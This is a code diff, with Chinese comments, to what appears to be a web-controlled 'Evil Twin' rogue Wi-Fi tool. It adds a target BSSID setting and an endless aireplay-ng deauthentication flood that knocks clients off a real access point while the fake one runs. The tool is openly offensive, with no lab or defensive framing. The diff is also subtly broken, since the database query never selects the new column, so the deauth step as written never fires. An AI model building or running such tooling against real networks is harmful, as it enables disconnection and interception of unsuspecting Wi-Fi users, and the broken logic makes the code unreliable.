@@ -253,9 +253,10 @@ def manage_config():
         evil_channel = data.get('evil_channel', 6)
         network_interface = data.get('network_interface', '')
         evil_passphrase = data.get('evil_passphrase', '12345678')
+        target_bssid = data.get('target_bssid', '')
         
-        conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ?, evil_passphrase = ? WHERE id = 1', 
-                    (evil_ssid, evil_channel, network_interface, evil_passphrase))
+        conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ?, evil_passphrase = ?, target_bssid = ? WHERE id = 1', 
+                    (evil_ssid, evil_channel, network_interface, evil_passphrase, target_bssid))
         conn.commit()
         conn.close()
         
@@ -662,6 +663,16 @@ def start_evil_twin():
     # 获取配置
     conn = get_db()
     config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
+    try:
+        target_bssid = config['target_bssid'] if config['target_bssid'] else ''
+    except:
+        target_bssid = ''
+        # 自动加列
+        try:
+            conn.execute("ALTER TABLE config ADD COLUMN target_bssid TEXT DEFAULT ''")
+            conn.commit()
+        except:
+            pass
     conn.close()
     
     evil_ssid = config['evil_ssid']
@@ -742,6 +753,11 @@ dhcp-authoritative
             pass
         return {'status': 'error', 'message': 'hostapd 启动失败', 'stderr': err}
     
+    # 启动 deauth（踢人）
+    if target_bssid and len(target_bssid) == 17:
+        subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid, iface],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
     return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动'}
 
 def is_process_running(name):
@@ -756,6 +772,7 @@ def stop_evil_twin(iface_override=None):
     
     run_cmd(['sudo', 'pkill', 'hostapd'])
     run_cmd(['sudo', 'pkill', 'dnsmasq'])
+    run_cmd(['sudo', 'pkill', 'aireplay-ng'])
     run_cmd(['sudo', 'systemctl', 'start', 'systemd-resolved'])
     if iface:
         run_cmd(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface])
